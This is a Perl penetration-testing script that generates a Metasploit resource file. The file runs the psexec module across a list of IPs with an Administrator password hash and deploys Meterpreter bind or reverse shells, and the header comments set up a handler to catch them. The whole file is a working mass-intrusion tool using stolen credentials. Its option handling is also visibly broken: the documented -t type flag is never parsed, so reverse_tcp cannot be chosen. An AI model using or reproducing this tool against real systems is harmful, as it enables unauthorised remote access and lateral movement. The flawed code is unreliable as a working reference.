#!/usr/bin/perl -w
#
# Copyright (C) 2010, Joshua D. Abraham (jabra@spl0it.org)
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation; either version 2 of the License, or
# (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA  02111-1307 USA
# use strict;
#
#
# psexec.pl - generate a metasploit rc file that can be used to exploit several
# systems using psexec.
#
################################################################################
#
# Bind_tcp usage
#  perl psexec.pl -f port445.txt -h hash -t bind_tcp > psexec.rc
#  $ msfconsole -r psexec.rc
#
#
################################################################################
#
# Reverse_tcp usage
#
#
# Setup Metasploit handler
#
#   ./msfconsole
#   use exploit/multi/handler
#   set ExitOnSession false
#   set PAYLOAD windows/meterpreter/reverse_tcp
#   set LHOST x.x.x.x
#   set LPORT 4444
#   exploit -j
#   [... waiting for shells...]
#
# Perform PSEXEC attack in another terminal
#
#   $ perl psexec.pl -f port445.txt -i x.x.x.x -h hash -t reverse_tcp > psexec.rc
#   $ msfconsole -r psexec.rc
#  
#
use strict;
use Getopt::Long;
use vars qw( $PROG );
( $PROG = $0 ) =~ s/^.*[\/\\]//;    # Truncate calling path from the prog name
my $AUTH    = 'Joshua D. Abraham';  # author
my $EMAIL   = 'jabra@spl0it.org';   # email
my $VERSION = '1.00';               # version
my %options;                        # getopt option hash
my $input_file;
my $reverse_ip;
my $lport_port=4444;
my $user='Administrator';
my $type='bind_tcp';
my $hash;
my $sleep = 3;
my $script;
#
# help:
# display help information
#
sub help {
    print "Usage: $PROG [Required Options] [Additional Options] 

 Required Options:
    -f  --file [input]      IP list (one IP per line)
    -t  --type [string]     Payload type meterpreter. 
                            bind_tcp or reverse_tcp (default: bind_tcp)
    -h  --hash [string]     Adminstrator's hash (required)
    
 Reverse_tcp Options:
    -i  --ip [string]       Reverse IP for connect back 
    -p  --port [num]        Reverse Port for connect back 

 Additional Options:
    -u  --user [string]     Alternative Adminstrator's username
    -s  --script [string]   Set AutoRunScript(s)
    -w  --wait [num]        Number of seconds to wait between connections

    -v  --version           Display version
        --help              Display this information
Send Comments to $AUTH ( $EMAIL )\n";
    exit;
}

#
# print_version:
# displays version
#
sub print_version {
    print "$PROG version $VERSION by $AUTH ( $EMAIL )\n";
    exit;
}

if ( @ARGV == 0 ) {
    help;
    exit;
}
GetOptions(
    \%options,
    'file|f=s', 'hash|h=s', 'user|u=s', 'port|p=s','ip|i=s','script|s=s','wait|w=s',
    'help'    => sub { help(); },
    'version|v' => sub { print_version(); },
) or exit 1;

if ( !defined($options{ip}) or !defined($options{file}) or !defined($options{hash}) ) {
    help();
}
else {
    if ( defined( $options{port} ) ) {
        $lport_port = $options{port};
    }

    if ( defined( $options{user} ) ) {
        $user = $options{user};
    }

    $hash = $options{hash};
    $input_file = $options{file};
    $reverse_ip = $options{ip};
    
    print "use windows/smb/psexec\n";
    if ($type eq 'reverse_tcp') {
        print "set PAYLOAD windows/meterpreter/reverse_tcp\n";
        print "set LHOST $reverse_ip\n";
        print "set LPORT $lport_port\n";
        print "set DisablePayloadHandler true\n";
    }
    else {
        print "set PAYLOAD windows/meterpreter/bind_tcp\n";
    }
    print "set LPORT $lport_port\n";
    print "set SMBUser $user\n";
    print "set SMBPass $hash\n";

    if (defined ($options{script} ) ) {
        $script = $options{script};
        print "set AutoRunScript $script\n";
    }

    open(IN, $input_file) or die "can't open $input_file\n";
    while(<IN>) {
        chomp;
        print "set RHOST $_\n";
        print "exploit -j\n";
        print "sleep $sleep\n";
    }
}
